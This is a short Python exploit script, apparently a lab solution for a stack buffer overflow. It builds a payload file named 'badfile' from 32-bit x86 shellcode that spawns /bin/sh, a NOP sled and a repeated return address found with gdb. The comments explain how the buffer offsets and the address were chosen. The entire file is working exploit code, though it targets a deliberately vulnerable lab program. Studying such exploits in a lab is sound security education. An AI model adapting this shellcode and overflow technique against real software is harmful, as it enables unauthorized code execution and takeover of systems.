#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode = (
	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
	"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
	"\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(800))


########################################################################
# Put the shellcode somewhere in the payload
# Decide the return address value
# and put it somewhere in the payload

# randomly chosen 192
start = 192			# Change this number
content[start: start+ len(shellcode)] = shellcode

# 0xffffcaed found with the smallest buffer size (i.e. 308-24), this is the value of &buffer found through gdb, 0x80 added to compensate for debugger.
ret = 0xffffcaed + 0x80
L = 4

# ($ebp - &buffer ) value was 731 for the smallest buffer size, 
# and 779 for the largest.

for i in range(735, 787, 4):
	content[i:i+4] = (ret).to_bytes(L, "little")

##########################################################################

# Write the content to a file
with open("badfile", "wb") as file:
	file.write(content)

print("Written content to badfile")


